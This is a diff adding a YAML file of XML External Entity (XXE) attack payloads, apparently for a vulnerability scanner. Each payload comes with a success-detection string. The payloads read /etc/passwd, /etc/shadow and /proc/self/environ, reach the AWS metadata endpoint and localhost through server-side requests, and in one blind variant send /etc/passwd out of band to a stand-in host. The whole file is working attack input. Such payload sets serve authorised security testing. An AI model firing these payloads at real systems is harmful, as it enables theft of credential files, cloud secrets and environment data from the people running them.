@@ -1,0 +1,67 @@
+category: xxe
+description: "Payloads XXE — file disclosure, SSRF interne, billion laughs"
+
+payloads:
+  # ── File disclosure ──────────────────────────────────────────────────────────
+  - kind: file_disclosure
+    description: "Lecture /etc/passwd via entité externe"
+    value: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+      <root><data>&xxe;</data></root>
+    detect: "root:"
+
+  - kind: file_disclosure
+    description: "Lecture /etc/hostname via entité externe"
+    value: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+      <root><data>&xxe;</data></root>
+    detect: ""
+
+  - kind: file_disclosure
+    description: "Lecture /etc/shadow (confirmation privilèges)"
+    value: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
+      <root><data>&xxe;</data></root>
+    detect: "root:"
+
+  - kind: file_disclosure
+    description: "Lecture /proc/self/environ — variables d'environnement"
+    value: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]>
+      <root><data>&xxe;</data></root>
+    detect: "PATH="
+
+  # ── SSRF interne via entité externe ─────────────────────────────────────────
+  - kind: ssrf
+    description: "SSRF vers AWS IMDS via XXE"
+    value: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+      <root><data>&xxe;</data></root>
+    detect: "ami-id"
+
+  - kind: ssrf
+    description: "SSRF vers localhost via XXE"
+    value: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>
+      <root><data>&xxe;</data></root>
+    detect: ""
+
+  # ── Blind XXE via paramètre ──────────────────────────────────────────────────
+  - kind: blind
+    description: "Blind XXE — entité paramètre avec exfiltration OOB"
+    value: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [
+        <!ENTITY % file SYSTEM "file:///etc/passwd">
+        <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nevelio-oob.example.com/?x=%file;'>">
+        %eval;
+        %exfil;
+      ]>
+      <root/>
+    detect: ""
